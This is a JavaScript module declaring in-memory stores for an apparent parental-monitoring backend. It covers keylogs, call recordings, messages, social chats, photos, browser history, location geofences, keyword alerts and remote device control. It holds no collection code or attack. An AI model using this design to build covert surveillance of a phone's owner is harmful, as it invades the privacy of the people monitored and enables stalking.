/** Shared in-memory stores (local server + Vercel serverless). */
export const deviceInvites = new Map();
export const boundDevices = [];

export const realLocations = [];
export const realCallLogs = [];
export const realMessages = [];
export const realSocialChats = [];
export const realContacts = [];
export const realUsageStats = [];
export const realInstalledApps = [];
export const realNotifications = [];
export const realBrowserHistory = [];
export const realWifiLogs = [];
export const realSafetyAlerts = [];
export const realPhotos = [];
export const realKeylogs = [];
export const realAppCalls = [];
export const realCalendarEvents = [];
export const realGeofenceEvents = [];
export const realKeywordAlerts = [];
export const realCallRecordings = [];

export const geofences = [
  { id: "home", name: "Home", lat: 39.9526, lng: -75.1652, radiusM: 250, enabled: true },
  { id: "school", name: "School", lat: 39.9612, lng: -75.1498, radiusM: 350, enabled: true }
];
export const geofenceStateByDevice = {};

export let trackedKeywords = [
  "robux", "hack", "drink", "hurt", "party", "secret", "password", "cheat"
];

export const remoteControlByDevice = new Map();

export function allStateStores() {
  return {
    deviceInvites,
    boundDevices,
    remoteControlByDevice,
    geofenceStateByDevice,
    geofences,
    trackedKeywords,
    realLocations,
    realCallLogs,
    realMessages,
    realSocialChats,
    realContacts,
    realUsageStats,
    realInstalledApps,
    realNotifications,
    realBrowserHistory,
    realWifiLogs,
    realSafetyAlerts,
    realPhotos,
    realKeylogs,
    realAppCalls,
    realCalendarEvents,
    realGeofenceEvents,
    realKeywordAlerts,
    realCallRecordings
  };
}
